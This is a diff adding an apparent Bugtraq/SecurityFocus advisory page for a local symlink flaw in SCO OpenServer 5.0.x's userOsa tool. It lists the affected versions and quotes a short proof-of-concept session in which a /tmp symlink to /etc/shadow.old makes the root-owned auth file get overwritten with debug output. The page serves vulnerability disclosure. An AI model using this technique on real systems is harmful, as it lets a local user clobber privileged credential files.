@@ -1,0 +1,110 @@
+<p><b><span style="font-size: 18pt;">SCO OpenServer 5.0.5 'userOsa'  symlink Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/701/info">info</a><br><a href="http://www.securityfocus.com/bid/701/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/701/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/701/solution">solution</a><br><a href="http://www.securityfocus.com/bid/701/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				701
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Origin Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 11 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Oct 11 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to the Bugtraq mailing list by "Brock Tellier" &lt;btellier@webley.com&gt; on Mon, 11 Oct 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SCO Open Server 5.0.5 <br/>
+					
+				
+					SCO Open Server 5.0.4 <br/>
+					
+				
+					SCO Open Server 5.0.3 <br/>
+					
+				
+					SCO Open Server 5.0.2 <br/>
+					
+				
+					SCO Open Server 5.0.1 <br/>
+					
+				
+					SCO Open Server 5.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	As per Brock Tellier's original posting to Bugtraq:<br/><br/><br/><br/>scohack:/tmp$ ln -s /etc/shadow.old debug.log<br/>scohack:/tmp$ /etc/sysadm.d/bin/userOsa<br/>bah<br/>connectFail {{SCO_LOCAL_PIPE_ERR_INVALID_CONNECT_REQ {Invalid Connect<br/>Request: bah}}}<br/>Failed to listen to client<br/>Failure in making connection to OSA.<br/>scohack:/tmp$<br/><br/>-----<br/><br/>BEFORE EXPLOIT:<br/>scohack:/# l /etc/shadow.old<br/>-rw-rw----   1 root     auth          26 Oct 11 20:08 /etc/shadow.old<br/><br/>AFTER EXPLOIT (note the file size):<br/>scohack:/# l /etc/shadow.old<br/>-rw-rw----   1 root     auth         177 Oct 11 20:10 /etc/shadow.old<br/><br/>scohack:/# cat /etc/shadow.old<br/>&gt;&gt;&gt; Debug log opened at Mon Oct 11 03:10:04 PM CDT 1999 by &lt;PID=11604&gt;<br/>&lt;&lt;&lt;<br/>SendConnectFail(connectFail {{SCO_LOCAL_PIPE_ERR_INVALID_CONNECT_REQ<br/>{Invalid Connect Request: bah}}})<br/><br/>scohack:/#
+	
+		<ul>
+</ul>
+</div>
